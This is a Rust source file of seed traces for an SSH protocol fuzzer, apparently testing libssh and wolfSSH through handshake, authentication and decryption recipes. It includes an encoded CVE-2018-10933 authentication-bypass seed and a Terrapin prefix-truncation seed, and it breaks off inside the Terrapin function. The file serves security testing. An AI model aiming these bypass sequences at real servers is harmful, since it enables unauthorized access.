use puffin::agent::{AgentDescriptor, AgentName};
use puffin::algebra::Term;
use puffin::term;
use puffin::trace::{InputAction, OutputAction, Trace};

use crate::protocol::{
    AgentType, RawSshMessageFlight, SshDescriptorConfig, SshProtocolBehavior, SshProtocolTypes,
};
use crate::ssh::fn_impl::*;
use crate::ssh::message::{
    CompressionAlgorithms, EncryptionAlgorithms, KexAlgorithms, MacAlgorithms, OnWireData,
    RawSshMessage, SignatureSchemes, SshBytes, SshMessage,
};

// ── Seed: client attacker with full handshake and encrypted post-NewKeys ──────
//
// The fuzzer acts as the SSH client; the server is a real libssh instance.
// We compute the exchange hash using the actual server ephemeral ECDH key and
// derive the encryption key so we can send properly encrypted post-NewKeys
// messages (ServiceRequest, UserAuthRequest, ChannelOpen, ChannelRequest).

pub fn seed_client_attacker_full(server: AgentName) -> Trace<SshProtocolTypes> {
    // Knowledge available after OutputAction + sending banner/kexinit/EcdhInit:
    //   (server, 0)[None]/RawSshMessage → server banner
    //   (server, 0)[None]/SshMessage    → server KexInit
    //   (server, 1)[None]/SshMessage    → server KexEcdhReply

    let server_banner_raw = term! { (server, 0)[None]/RawSshMessage };
    let server_banner_id = term! { fn_banner_id((@server_banner_raw)) };

    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    // Use RawSshMessage for K_S extraction (SshMessage lossy-parses RSA keys).
    // RawSshMessage indices: 0=Banner, 1=KexInit, 2=KexEcdhReply, 3=NewKeys
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };

    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };

    let shared = term! {
        fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub))
    };

    // Our kexinit mirrors server's algorithms.
    let our_kexinit = term! {
        fn_kex_init(
            (fn_placeholder_16bytes),
            ((server, 0)[None]/KexAlgorithms),
            ((server, 0)[None]/SignatureSchemes),
            ((server, 0)[None]/EncryptionAlgorithms),
            ((server, 1)[None]/EncryptionAlgorithms),
            ((server, 0)[None]/MacAlgorithms),
            ((server, 1)[None]/MacAlgorithms),
            ((server, 0)[None]/CompressionAlgorithms),
            ((server, 1)[None]/CompressionAlgorithms)
        )
    };

    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };

    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id),
            (@server_banner_id),
            (@i_c),
            (@i_s),
            (@server_hostkey),
            (fn_client_ecdh_pubkey),
            (@server_ecdh_pub),
            (@shared)
        )
    };

    let enc_key = term! {
        fn_derive_enc_key_c2s((@shared), (@exch_hash), (@exch_hash))
    };

    // Sequence numbers: banner is NOT a binary packet.
    // Binary packets we send: KexInit(0), KexEcdhInit(1), NewKeys(2)
    // First encrypted packets: ServiceRequest(3), AuthRequest(4),
    //   ChannelOpen(5), ChannelRequest(6)
    let svc_req = term! {
        fn_encrypt_packet(
            (fn_service_request((fn_ssh_userauth))),
            (@enc_key),
            (fn_u32_3)
        )
    };
    let auth_req = term! {
        fn_encrypt_packet(
            (fn_user_auth_request(
                (fn_username),
                (fn_ssh_connection),
                (fn_method_password),
                (fn_password_auth_data((fn_password)))
            )),
            (@enc_key),
            (fn_u32_4)
        )
    };
    let chan_open = term! {
        fn_encrypt_packet(
            (fn_channel_open(
                (fn_channel_session),
                (fn_u32_0),
                (fn_u32_1),
                (fn_u32_2),
                (fn_empty_bytes_vec)
            )),
            (@enc_key),
            (fn_u32_5)
        )
    };
    let chan_req = term! {
        fn_encrypt_packet(
            (fn_channel_request(
                (fn_u32_0),
                (fn_channel_exec),
                (fn_true),
                (fn_exec_payload((fn_ssh_userauth)))
            )),
            (@enc_key),
            (fn_u32_6)
        )
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            InputAction::new_step(server, term! { @auth_req }),
            InputAction::new_step(server, term! { @chan_open }),
            InputAction::new_step(server, term! { @chan_req }),
        ],
        ..Default::default()
    }
}

// ── Seed: client attacker authenticating with PUBLIC KEY (identity A) ─────────
//
// Same handshake as seed_client_attacker_full, but instead of password auth the
// fuzzer logs in with publickey method, signing the RFC 4252 §7 blob with client
// identity key A (the only client key whose private half is in the signature).
// This is the honest baseline for the entity-authentication / impersonation
// oracle: it completes as A; any mutation that makes the server authenticate a
// *different* key is flagged as impersonation.
pub fn seed_client_attacker_pubkey(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_raw = term! { (server, 0)[None]/RawSshMessage };
    let server_banner_id = term! { fn_banner_id((@server_banner_raw)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    let our_kexinit = term! {
        fn_kex_init(
            (fn_placeholder_16bytes),
            ((server, 0)[None]/KexAlgorithms),
            ((server, 0)[None]/SignatureSchemes),
            ((server, 0)[None]/EncryptionAlgorithms),
            ((server, 1)[None]/EncryptionAlgorithms),
            ((server, 0)[None]/MacAlgorithms),
            ((server, 1)[None]/MacAlgorithms),
            ((server, 0)[None]/CompressionAlgorithms),
            ((server, 1)[None]/CompressionAlgorithms)
        )
    };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let enc_key = term! { fn_derive_enc_key_c2s((@shared), (@exch_hash), (@exch_hash)) };

    let svc_req = term! {
        fn_encrypt_packet((fn_service_request((fn_ssh_userauth))), (@enc_key), (fn_u32_3))
    };

    // Publickey auth: sign the §7 blob (over the session id = exchange hash) with
    // key A, then carry A's blob + the signature in the request.
    let sig = term! {
        fn_sign_userauth((@exch_hash), (fn_username), (fn_ssh_connection), (fn_client_a_pubkey_blob))
    };
    let auth_req = term! {
        fn_encrypt_packet(
            (fn_user_auth_request(
                (fn_username),
                (fn_ssh_connection),
                (fn_method_publickey),
                (fn_publickey_auth_data((fn_client_a_pubkey_blob), (@sig)))
            )),
            (@enc_key),
            (fn_u32_4)
        )
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            InputAction::new_step(server, term! { @auth_req }),
        ],
        ..Default::default()
    }
}

// ── Seed: client attacker full handshake over AES-256-GCM ─────────────────────
//
// Same shape as seed_client_attacker_full but forces aes256-gcm@openssh.com
// (offered by BOTH libssh and wolfSSH), so this single seed completes the full
// handshake + encrypted record layer against both implementations. The fuzzer
// is the client; the libssh/wolfSSH server is the PUT.
pub fn seed_client_attacker_full_aesgcm(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id = term! { fn_banner_id(((server, 0)[None]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    // Fixed client KexInit offering only aes256-gcm.
    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };

    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    // c2s AES-256-GCM key + IV.
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (@exch_hash)) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (@exch_hash)) };

    // AES-GCM invocation counter = per-direction packet index since NewKeys (0,1,2,3).
    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_0))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request((fn_username), (fn_ssh_connection), (fn_method_password),
                                  (fn_password_auth_data((fn_password))))),
            (@key), (@iv), (fn_u32_1))
    };
    let chan_open = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_open((fn_channel_session), (fn_u32_0), (fn_u32_1), (fn_u32_2),
                             (fn_empty_bytes_vec))),
            (@key), (@iv), (fn_u32_2))
    };
    let chan_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_request((fn_u32_0), (fn_channel_exec), (fn_true),
                                (fn_exec_payload((fn_ssh_userauth))))),
            (@key), (@iv), (fn_u32_3))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            InputAction::new_step(server, term! { @auth_req }),
            InputAction::new_step(server, term! { @chan_open }),
            InputAction::new_step(server, term! { @chan_req }),
        ],
        ..Default::default()
    }
}

// ── Seed: CVE-2018-10933 authentication bypass (client attacker) ──────────────
//
// The fuzzer (client) completes the KEX, then — instead of authenticating —
// injects an SSH_MSG_USERAUTH_SUCCESS (a message a server should never accept)
// followed by a channel open. A libssh server vulnerable to CVE-2018-10933
// wrongly transitions to the authenticated state on the stray USERAUTH_SUCCESS
// and then accepts the channel open; the harness records a completed handshake
// with NO authentication method, which the entity-authentication oracle flags.
// A patched server ignores/rejects the stray message and never completes.
pub fn seed_client_attacker_auth_bypass(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_raw = term! { (server, 0)[None]/RawSshMessage };
    let server_banner_id = term! { fn_banner_id((@server_banner_raw)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };
    let our_kexinit = term! {
        fn_kex_init(
            (fn_placeholder_16bytes),
            ((server, 0)[None]/KexAlgorithms),
            ((server, 0)[None]/SignatureSchemes),
            ((server, 0)[None]/EncryptionAlgorithms),
            ((server, 1)[None]/EncryptionAlgorithms),
            ((server, 0)[None]/MacAlgorithms),
            ((server, 1)[None]/MacAlgorithms),
            ((server, 0)[None]/CompressionAlgorithms),
            ((server, 1)[None]/CompressionAlgorithms)
        )
    };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let enc_key = term! { fn_derive_enc_key_c2s((@shared), (@exch_hash), (@exch_hash)) };

    // The bypass: inject USERAUTH_SUCCESS (seqno 3), then a channel open (4).
    let bypass = term! {
        fn_encrypt_packet((fn_user_auth_success), (@enc_key), (fn_u32_3))
    };
    let chan_open = term! {
        fn_encrypt_packet(
            (fn_channel_open((fn_channel_session), (fn_u32_0), (fn_u32_1), (fn_u32_2),
                             (fn_empty_bytes_vec))),
            (@enc_key), (fn_u32_4))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @bypass }),
            InputAction::new_step(server, term! { @chan_open }),
        ],
        ..Default::default()
    }
}

// ── Seed: client attacker, PUBLIC KEY auth over AES-256-GCM (both vendors) ────
//
// Like seed_client_attacker_pubkey but over the AES-GCM record layer, so it
// completes on wolfSSH (which lacks chacha20-poly1305) as well as libssh. This
// is the cross-vendor baseline for the entity-authentication / impersonation
// oracle.
pub fn seed_client_attacker_pubkey_aesgcm(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id = term! { fn_banner_id(((server, 0)[None]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (@exch_hash)) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (@exch_hash)) };

    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_0))
    };
    let sig = term! {
        fn_sign_userauth((@exch_hash), (fn_username), (fn_ssh_connection), (fn_client_a_pubkey_blob))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request(
                (fn_username),
                (fn_ssh_connection),
                (fn_method_publickey),
                (fn_publickey_auth_data((fn_client_a_pubkey_blob), (@sig)))
            )),
            (@key), (@iv), (fn_u32_1))
    };
    // Channel traffic after auth — also pumps extra progress() iterations, which
    // wolfSSH's single-step accept() needs to finish processing the auth.
    let chan_open = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_open((fn_channel_session), (fn_u32_0), (fn_u32_1), (fn_u32_2),
                             (fn_empty_bytes_vec))),
            (@key), (@iv), (fn_u32_2))
    };
    let chan_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_request((fn_u32_0), (fn_channel_exec), (fn_true),
                                (fn_exec_payload((fn_ssh_userauth))))),
            (@key), (@iv), (fn_u32_3))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            InputAction::new_step(server, term! { @auth_req }),
            InputAction::new_step(server, term! { @chan_open }),
            InputAction::new_step(server, term! { @chan_req }),
        ],
        ..Default::default()
    }
}

// ── Seed: server attacker with full handshake ─────────────────────────────────
//
// The fuzzer acts as the SSH server; the client is a real libssh instance.
// We use our embedded RSA key to sign the exchange hash so libssh will accept
// the ECDH reply. Then we send encrypted server-to-client messages after NewKeys.

pub fn seed_server_attacker_full(client: AgentName) -> Trace<SshProtocolTypes> {
    // After OutputAction(client):
    //   (client, 0)[None]/RawSshMessage → client banner
    //   (client, 0)[None]/SshMessage    → client KexInit
    // After sending banner + kexinit, client sends KexEcdhInit:
    //   (client, 0)[None]/SshBytes      → client ephemeral pubkey Q_C

    let client_banner_raw = term! { (client, 0)[None]/RawSshMessage };
    let client_banner_id = term! { fn_banner_id((@client_banner_raw)) };
    let client_kexinit = term! { (client, 0)[None]/SshMessage };
    let q_c = term! { (client, 0)[None]/SshBytes };

    let our_kexinit = term! {
        fn_kex_init(
            (fn_placeholder_16bytes),
            ((client, 0)[None]/KexAlgorithms),
            ((client, 0)[None]/SignatureSchemes),
            ((client, 0)[None]/EncryptionAlgorithms),
            ((client, 1)[None]/EncryptionAlgorithms),
            ((client, 0)[None]/MacAlgorithms),
            ((client, 1)[None]/MacAlgorithms),
            ((client, 0)[None]/CompressionAlgorithms),
            ((client, 1)[None]/CompressionAlgorithms)
        )
    };

    let shared = term! {
        fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@q_c))
    };

    let i_c = term! { fn_kexinit_payload((@client_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@our_kexinit)) };

    let exch_hash = term! {
        fn_kex_exchange_hash(
            (@client_banner_id),
            (fn_puffin_id),
            (@i_c),
            (@i_s),
            (fn_server_rsa_pubkey_bytes),
            (@q_c),
            (fn_client_ecdh_pubkey),
            (@shared)
        )
    };

    let sig = term! { fn_sign_exchange_hash((@exch_hash)) };

    let enc_key_s2c = term! {
        fn_derive_enc_key_s2c((@shared), (@exch_hash), (@exch_hash))
    };

    // Sequence numbers for the server attacker:
    // Attacker sends: banner (not counted), KexInit(0), KexEcdhReply(1), NewKeys(2)
    // First encrypted packets: ServiceAccept(3), UserAuthSuccess(4)
    let svc_accept = term! {
        fn_encrypt_packet(
            (fn_service_accept((fn_ssh_userauth))),
            (@enc_key_s2c),
            (fn_u32_3)
        )
    };
    let auth_success = term! {
        fn_encrypt_packet(
            (fn_user_auth_success),
            (@enc_key_s2c),
            (fn_u32_4)
        )
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            client,
            SshDescriptorConfig {
                typ: AgentType::Client,
                try_reuse: false,
            },
        )],
        steps: vec![
            OutputAction::new_step(client),
            InputAction::new_step(client, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(client, term! { fn_packet((@our_kexinit)) }),
            // After sending kexinit, client emits KexEcdhInit (captured as q_c above)
            InputAction::new_step(
                client,
                term! {
                    fn_packet((fn_kex_ecdh_reply(
                        (fn_server_rsa_pubkey),
                        (fn_client_ecdh_pubkey),
                        (fn_ssh_signature(
                            (fn_algo_rsa_sha2_256),
                            (@sig)
                        ))
                    )))
                },
            ),
            InputAction::new_step(client, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(client, term! { @svc_accept }),
            InputAction::new_step(client, term! { @auth_success }),
        ],
        ..Default::default()
    }
}

// ── Seed: server attacker full handshake over AES-256-GCM ─────────────────────
//
// Fuzzer is the SERVER; the libssh/wolfSSH client is the PUT. Forces
// aes256-gcm@openssh.com and offers only rsa-sha2-256 as the host-key algorithm
// (so the negotiated algorithm matches the rsa-sha2-256 signature). Completes
// the full handshake + encrypted server responses against BOTH implementations.
pub fn seed_server_attacker_full_aesgcm(client: AgentName) -> Trace<SshProtocolTypes> {
    let client_banner_id = term! { fn_banner_id(((client, 0)[None]/RawSshMessage)) };
    let client_kexinit = term! { (client, 0)[None]/SshMessage };
    let q_c = term! { (client, 0)[None]/SshBytes };

    // Fixed server KexInit (aes256-gcm, rsa-sha2-256 host key).
    let our_kexinit = term! { fn_server_kexinit_aesgcm((fn_placeholder_16bytes)) };

    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@q_c)) };
    let i_c = term! { fn_kexinit_payload((@client_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@our_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (@client_banner_id), (fn_puffin_id), (@i_c), (@i_s),
            (fn_server_rsa_pubkey_bytes), (@q_c), (fn_client_ecdh_pubkey), (@shared)
        )
    };
    let sig = term! { fn_sign_exchange_hash((@exch_hash)) };
    // s2c AES-256-GCM key + IV (direction the server encrypts towards the client).
    let key = term! { fn_derive_aes_key_s2c((@shared), (@exch_hash), (@exch_hash)) };
    let iv = term! { fn_derive_iv_s2c((@shared), (@exch_hash), (@exch_hash)) };

    let svc_accept = term! {
        fn_encrypt_packet_aesgcm((fn_service_accept((fn_ssh_userauth))), (@key), (@iv), (fn_u32_0))
    };
    let auth_success = term! {
        fn_encrypt_packet_aesgcm((fn_user_auth_success), (@key), (@iv), (fn_u32_1))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            client,
            SshDescriptorConfig {
                typ: AgentType::Client,
                try_reuse: false,
            },
        )],
        steps: vec![
            OutputAction::new_step(client),
            InputAction::new_step(client, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(client, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                client,
                term! {
                    fn_packet((fn_kex_ecdh_reply(
                        (fn_server_rsa_pubkey),
                        (fn_client_ecdh_pubkey),
                        (fn_ssh_signature((fn_algo_rsa_sha2_256), (@sig)))
                    )))
                },
            ),
            InputAction::new_step(client, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(client, term! { @svc_accept }),
            InputAction::new_step(client, term! { @auth_success }),
        ],
        ..Default::default()
    }
}

/// Differential-fuzzing decryption recipes for a libssh **server** agent.
///
/// After NewKeys the server's responses are opaque `OnWire` ciphertext, so to
/// compare two PUTs structurally we reconstruct the server→client (s2c) key
/// from the server's observed KEX output (exactly as `seed_client_attacker_full`
/// derives the c2s key, but for the 'D' direction) and decrypt each encrypted
/// server output back into a typed `SshMessage`.
///
/// The s2c sequence number after NewKeys depends on whether the server enabled
/// strict KEX (Terrapin mitigation): strict resets the counter to 0, otherwise
/// it continues (KexInit=0, KexEcdhReply=1, NewKeys=2 → first encrypted = 3).
/// We therefore emit a recipe at BOTH the strict (0,1,2) and non-strict (3,4,5)
/// sequence numbers for each of the first three encrypted outputs; the wrong
/// seqno fails the Poly1305 tag and is skipped during evaluation, so each PUT's
/// decrypted store fills in message order and the two stores stay aligned.
pub fn server_decryption_recipes(server: AgentName) -> Vec<Term<SshProtocolTypes>> {
    // Reconstruct the exchange hash from the server's KEX output (mirrors
    // seed_client_attacker_full).
    let server_banner_id = term! { fn_banner_id(((server, 0)[None]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! {
        fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub))
    };
    let our_kexinit = term! {
        fn_kex_init(
            (fn_placeholder_16bytes),
            ((server, 0)[None]/KexAlgorithms),
            ((server, 0)[None]/SignatureSchemes),
            ((server, 0)[None]/EncryptionAlgorithms),
            ((server, 1)[None]/EncryptionAlgorithms),
            ((server, 0)[None]/MacAlgorithms),
            ((server, 1)[None]/MacAlgorithms),
            ((server, 0)[None]/CompressionAlgorithms),
            ((server, 1)[None]/CompressionAlgorithms)
        )
    };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id),
            (@server_banner_id),
            (@i_c),
            (@i_s),
            (@server_hostkey),
            (fn_client_ecdh_pubkey),
            (@server_ecdh_pub),
            (@shared)
        )
    };
    let key = term! { fn_derive_enc_key_s2c((@shared), (@exch_hash), (@exch_hash)) };

    // Decrypt each of the first three encrypted server outputs at both the
    // strict (0,1,2) and non-strict (3,4,5) s2c sequence numbers. The wrong
    // seqno fails the Poly1305 tag during evaluation and is skipped, so both
    // PUTs' decrypted stores fill in message order and stay aligned.
    let mk = |idx_term: Term<SshProtocolTypes>, seqno: Term<SshProtocolTypes>| {
        let key = key.clone();
        term! { fn_decrypt_packet((@idx_term), (@key), (@seqno)) }
    };

    vec![
        mk(term! { (server, 0)[None]/OnWireData }, term! { fn_u32_0 }),
        mk(term! { (server, 0)[None]/OnWireData }, term! { fn_u32_3 }),
        mk(term! { (server, 1)[None]/OnWireData }, term! { fn_u32_1 }),
        mk(term! { (server, 1)[None]/OnWireData }, term! { fn_u32_4 }),
        mk(term! { (server, 2)[None]/OnWireData }, term! { fn_u32_2 }),
        mk(term! { (server, 2)[None]/OnWireData }, term! { fn_u32_5 }),
    ]
}

/// Two-honest-party handshake: both the client and the server are real PUTs,
/// and the Dolev-Yao attacker sits on the wire, here simply relaying each
/// party's output flight to the other faithfully (the benign baseline). This is
/// the trace shape required for the *matching-conversation* property — a
/// security property that is only definable with two honest endpoints to
/// compare. Mutations of this seed (drop / insert / reorder relayed messages)
/// are what a transcript-integrity attack like Terrapin would exercise.
pub fn seed_handshake_two_party(client: AgentName, server: AgentName) -> Trace<SshProtocolTypes> {
    Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor::from_config(
                client,
                SshDescriptorConfig {
                    typ: AgentType::Client,
                    try_reuse: false,
                },
            ),
            AgentDescriptor::from_config(
                server,
                SshDescriptorConfig {
                    typ: AgentType::Server,
                    try_reuse: false,
                },
            ),
        ],
        steps: vec![
            // Bootstrap: both peers emit their banner + KEXINIT without waiting.
            OutputAction::new_step(client),
            OutputAction::new_step(server),
            // Relay, letting each delivery drive the receiver's next output.
            InputAction::new_step(server, term! { (client, 0)/RawSshMessageFlight }),
            InputAction::new_step(client, term! { (server, 0)/RawSshMessageFlight }),
            InputAction::new_step(server, term! { (client, 1)/RawSshMessageFlight }),
            InputAction::new_step(client, term! { (server, 1)/RawSshMessageFlight }),
            InputAction::new_step(server, term! { (client, 2)/RawSshMessageFlight }),
            InputAction::new_step(client, term! { (server, 2)/RawSshMessageFlight }),
            InputAction::new_step(server, term! { (client, 3)/RawSshMessageFlight }),
            InputAction::new_step(client, term! { (server, 3)/RawSshMessageFlight }),
            InputAction::new_step(server, term! { (client, 4)/RawSshMessageFlight }),
            InputAction::new_step(client, term! { (server, 4)/RawSshMessageFlight }),
        ],
        ..Default::default()
    }
}

/// Hybrid Terrapin attempt: relay the handshake at **flight** granularity
/// (preserving each PUT's I/O batching, so it completes) but at the targeted
/// c2s point (a) insert a cleartext `SSH_MSG_IGNORE` before the client's NEWKEYS
/// — bumping the server's c2s sequence number by one — and (b) forward the
/// client's post-NEWKEYS encrypted packets individually as `OnWireData`,
/// **dropping the first one**. The inserted IGNORE and the dropped packet cancel
/// in the sequence counter, so the server's AEAD tags still verify (Terrapin
/// prefix truncation). If the dropped packet is ignorable (e.g. EXT_INFO) both
/// peers still complete, but the server never saw it — and the trace-aware
/// matching-conversation oracle flags the divergence. On strict-kex (0.11.4) the
/// server must abort on the IGNORE during KEX, so it never completes.
pub fn seed_terrapin_attempt(
    client: AgentName,
    server: AgentName,
) -> Trace<SshProtocolTypes> {
    Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor::from_config(
                client,
                SshDescriptorConfig { typ: AgentType::Client, try_reuse: false },
            ),
            AgentDescriptor::from_config(
                server,
                SshDescriptorConfig { typ: AgentType::Server, try_reuse: false },
            ),
        ],
        steps: vec![
            OutputAction::new_step(client),
            OutputAction::new_step(server),
            // Cleartext handshake, flight-forwarded (batching preserved).
